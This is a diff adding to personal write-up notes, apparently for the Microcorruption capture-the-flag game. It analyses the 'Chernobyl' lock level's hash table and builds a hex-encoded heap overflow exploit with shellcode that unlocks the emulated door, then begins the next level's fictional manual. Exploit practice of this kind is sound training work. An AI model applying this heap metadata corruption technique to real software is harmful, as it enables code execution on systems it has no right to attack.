@@ -800,3 +800,90 @@ Note - apparently jmp #0x10 doesn't work and I needed to use call #0x10.  I used
 ### Level 16 / Chernobyl (Hardware revision D, Software 02)
 Looking back through my notes I see that hardware revision D software 01 was Algiers, which was the heap exploitation level.
 Looking through the program very quickly I see that it has walk/run/get_from_table/hash/rehash/get_from_table/create_hash_table/malloc/free functions...this looks like writing past a malloc'd buffer is going to be a little harder this time!
+When you run the program, you get prompted "Welcome to the lock controller. You can open the door by entering 'access [your name] [pin]'"
+The main() function in the program is run()
+It starts off by calling create_hash_table(3,5) and then getting 0x550 bytes of input. Next there's a comparison of our input to 'a', if it doesn't match, it goes down to a comparison to 'n', if that doesn't match the program exits.  Looking down past the comparison for a, i see a comparison for ';' and a blank space.
+Based on the strings in the program, it looks like I can add in user accounts.  I type add user 1234 and it responds with 'adding user account user with pin 04d2'!  I then enter access user 1234 and it says 'Access granted; but account not activated'.  Boo.
+ Presumably we're going to need to take advantage of a free() after a heap overflow, so I wonder when free() gets called (when a user is deleted or during a hash table resize?).
+ I'm probably going to need to understand the create_hash_table function a little better
+  create_hash_table(numBins, binSize) //creates numBins of size 2^(binSize+1).
+  The hash() function hashes the username...this is what is being used as the key to our hashtable.  What happens when we try to insert multiple values that have the same hash?
+  create_hash_table creates a hash_table structure that is 0xa bytes.  DWORD *ht = malloc(0xa).  What are the fields in this structure?  During initialization, we see it set ht[0] = 0, ht[1] = arg1 ht[2] = arg2 ht[3] = malloc(2^(arg1+1))  ht[4] = malloc(2^(arg1+1)). This ht struct is stored at 0x5006 in our case
+  Immediately after create_hash_table is called, ht[3] and ht[4] point to 5016 and 50c2. 5016 looks like possibly a malloc'd chunk w/ header, and 50c2 is all 0'd out.
+  Typically heap exploits rely on free() being called on a corrupted block, so I looked through and saw that only rehash() called free..looks like i'll need to know how to trigger rehash() 
+  Examining ht[0] while adding users, ht[0] looksl ike a counter for the # of values stored.  
+  I wrote a quick program that generated a lot of users with the same hash, I found that I could enter 21 usernames, but when I entered a 22nd username i got a heap exhausted; aborting error.  I also noticed that ht[1] counter went down to 0 after the 22nd username was entered.  What exactly is causing the heap exhausted error?
+  I set a break at rehash, and saw that 12 entries had been added before rehash was called for the first time and 21 the second time.  Also, the ht[1] (which i had throught was hard-coded to 3) changed from 3 to 4.
+  I set bp's on each of the 3 free() calls in rehash() and ran with my 22 usernames with identical hashes.  The first rehash call (0xb entries) resulted in a free(*r10) call, where r10=5016 and *r10 = 5042.  ht[3] was 5016 at the rehash() function start, but ht[3] was 5342 at the time of the call, so the ht[3] parameter is used presumably a pointer to a linked list that rehash updates?
+    During the second reshash() call i get the heap exhaused call in malloc() after the call at 0x493e.
+   Looking at ht[3] in rehash(), I can see that it looks like an array of size 10 of pointers. 
+   The rehash() function is called from add_to_table().  rehash() gets called if ht[0] >=10.  
+   
+   add_to_table(pin,username,ht)
+     add_to_table() calls rehash if ht[0] >=10?
+     increments ht[0], calls hash(username)
+     offset=hash(username)&7//?
+     r15=ht[4]
+		 r14=r15[offset]
+		 r11=ht[3]
+		 r11=ht[3]+8
+the create_hash_table(3,5) is setting up a hashtable with an initial size (3) that can grow, but a fixed number of entries per bin (5).  The bin a user is placed in is based on it's hash.  If we can put more than 5 users in a bin, then we can start overwriting malloc'd chunks metadata.  If we then add in more users than the size of the table, we can trigger a rehash() which will cause free() to be called.  If we control the chunk metadata when free() is called, we have arbitrary code execution.
+ht[3] is an array of pointers to our chain while ht[4] is an array of cells in each of the chains
+With this information, I set a break in add_to_table and started tracking where in the heap my values were being added.  I think I want to go in the second to last bucket, so I can overflow into the metadata of the next bucket, otherwise i'll just be overflowing to uninit'd data.
+When free() is called from rehash() at 499e, the ret addr is stored in 0x3dce.
+	 So, when we overwrite the the metadata of the next bucket, we'll overwrite that retAddr w/ our shellcode, just like in algiers.  This wasn't working for me...I'd have the chunk data set up the way I wanted, but by the time free() was called on that chunk, the values had changed.  I think this means i want to put my values in the first chunk and overwrite the second chunk so nothign has had time to mess up the values.
+	 To put stuff in the first bucket, I can use anything that hash()%7 is 0, so I just picked ascii values that ended in 0 or 8.
+	 new ( A;new 0 A;new 8 A;new @ A;new H A
+	 there's going to be a malloc() call before my free.  If i mess up the chunk's forward pointer, i'll get the heap exhaustion error message.  Can I have arbitrary write with only modifying the previous pointer for the chunk?  Yes! Just need to modify the prevPtr and size values to return to my input
+6e6577202820413b6e6577203020413b6e6577203820413b6e6577204020413b6e6577204820413b6e657720CA3DDC52bdf4203b6e6577204264656520613b6e6577204264664620613b6e6577204265466520613b6e6577204265474620613b6e6577204345656520613b6e657720434566463b41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414160606060606060606060
+
+Working input that brings me to 0x3e64, which is my A's input!  Now i just need to convert my string of A's to shellcode that will open the door.  
+6e6577202820413b6e6577203020413b6e6577203820413b6e6577204020413b6e6577204820413b6e657720CA3DDC52bdf4203b #add in the users/overwrite the next blocks prevPtr and set size so it'll overwrite retAddr with the addr of my shellcode
+6e6577204264656520613b6e6577204264664620613b6e6577204265466520613b6e6577204265474620613b6e6577204345656520613b6e65772043456646 #add in users to trigger rehash()
+3b41414141324000ffb0121000 #shellcode to trigger the door unlock
+final input:
+6e6577202820413b6e6577203020413b6e6577203820413b6e6577204020413b6e6577204820413b6e657720CA3DDC52bdf4203b6e6577204264656520613b6e6577204264664620613b6e6577204265466520613b6e6577204265474620613b6e6577204345656520613b6e657720434566463b41414141324000ffb0121000
+
+### Level 17 / Hollywood
+Lockitall                                            LOCKIT PRO r a.04
+______________________________________________________________________
+
+              User Manual: Lockitall LockIT Pro, rev a.04              
+______________________________________________________________________
+
+
+OVERVIEW
+
+    - New randomization improves code security.
+    - This lock is not attached to any hardware security module.
+
+
+DETAILS
+
+    The LockIT Pro a.04  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There is  no default password  on the LockIT  Pro---upon receiving
+    the LockIT Pro, a new password must be set by connecting it to the
+    LockIT Pro  App and  entering a password  when prompted,  and then
+    restarting the LockIT Pro using the red button on the back.
+    
+    This is Hardware  Version A.  It contains  the Bluetooth connector
+    built in, and one available port  to which the LockIT Pro Deadbolt
+    should be connected.
+
+    This is Software  Revision 04. Our developers have  included a new
+    hardware  random number  generator, making  it impossible  to know
+    where the password  will be. We apologize again for  making it too
+    easy  for the  password to  be recovered.   Those responsible  for
+    sacking the engineers who were previously sacked have been sacked.
+
+
+
